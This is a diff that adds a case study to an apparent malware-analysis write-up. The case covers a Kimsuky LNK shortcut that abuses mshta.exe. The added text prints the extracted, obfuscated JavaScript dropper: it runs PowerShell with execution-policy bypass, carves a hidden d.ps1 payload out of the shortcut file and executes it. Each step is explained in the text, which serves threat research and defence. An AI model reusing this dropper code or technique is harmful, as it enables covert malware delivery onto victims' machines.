@@ -56,3 +56,52 @@ Then, after doing some research, I found that this is a **decoy RTF file**, whil
 
 For anyone interested in researching further on **how SideWinder targets victims or delivers the actual RTF payload**, you can refer to this [research](https://blog.strikeready.com/blog/rattling-the-cage-of-a-sidewinder/).
 
+### Case 2 : Kimsuky using malicious LNK file to drop PowerShell payload.
+
+In this case, I analyzed an **LNK file** and began by examining its **file structure**. During the analysis, I identified the following **flags**, which I will detail below.
+
+LNK File Structure Analysis :
+
+- **Flags Breakdown**:
+    - `HasLinkTargetIDList`: Indicates that the LNK file contains a target ID list, pointing to a specific file or directory.
+    - `HasLinkInfo`: Provides additional path information about the target file.
+    - `HasArguments`: 
+    When `HasArguments` is set, it means the LNK file has extra parameters (Command -line arguments) that will be executed when the shortcut is opened.
+    - `EnableTargetMetadata`: Allows retrieving metadata for the target file.
+- Target Execution Path:
+  ![image_kimsuky](https://github.com/user-attachments/assets/88a27a9c-a177-4722-a1d2-186294f46347)
+
+- **LinkTargetIDList →** `CLSID_MyComputer\C:\Windows\System32\mshta.exe`
+- `mshta.exe` is a legitimate Windows utility, but attackers often misuse it to run **obfuscated JavaScript** for executing hidden **PowerShell commands**. This can download and execute malicious files. This technique falls under **LOLBins**, where trusted Windows utilities are exploited to bypass security detection.
+
+Command-Line Arguments: Embedded JavaScript Execution
+
+The **Command-Line Arguments** field in the LNK file contains **JavaScript code**, which will be executed along with **`mshta.exe`**. This means that when the LNK file is opened, `mshta.exe` will **run the JavaScript code**, potentially executing further malicious scripts.
+
+Extracted JavaScript Code :
+
+After extracting the JavaScript embedded in the LNK file, I obtained the following script:
+
+```jsx
+javascript:v=" -Encoding Byte;sc ";
+s="a=new Ac"+"tiveXObject('WSc"+"ript.Shell');a.Run(c,0,true);close();";
+c="powe"+"rshell -ep bypass -c $t=0x1be8;$k = Get-ChildItem .lnk | where-object {$*.length -eq $t} | Select-Object -ExpandProperty Name;
+if($k.count -eq 0){$k=Get-ChildItem $env:T"+"EMP\\\\*.lnk | where-object{$*.length -eq $t};};
+$w='c:\\programdata\\d.ps1';
+$f=gc $k"+v+"$w ([byte[]]($f | sel"+"ect -Skip 0x094a)) -Force"+v+"c:\\programdata\\b21111 0;
+po"+"wersh"+"ell -ep bypass -f $w;";
+eval(s);
+```
+This JavaScript code is trying to run a hidden **PowerShell command** using `mshta.exe`. It does this in several steps:
+
+- The script creates a **WScript.Shell** object, which helps run commands on Windows.
+- It then prepares a PowerShell command and executes it.
+- The script looks for a **.lnk (shortcut) file** in the current folder.
+- If it doesn't find the file, it searches in the **TEMP folder**.
+- It checks if the file has a **specific size (7144 bytes)** to make sure it's the correct one.
+- The script **reads the contents** of the .lnk file.
+- It **skips the first part** of the file (2378 bytes) and extracts **some hidden data**.
+- This data is saved as a new **PowerShell script** (`d.ps1`).
+- The script **runs `d.ps1` using PowerShell**, which could be another piece of malware.
+- It also calls another unknown program (`b21111`), which might be part of the attack.
+
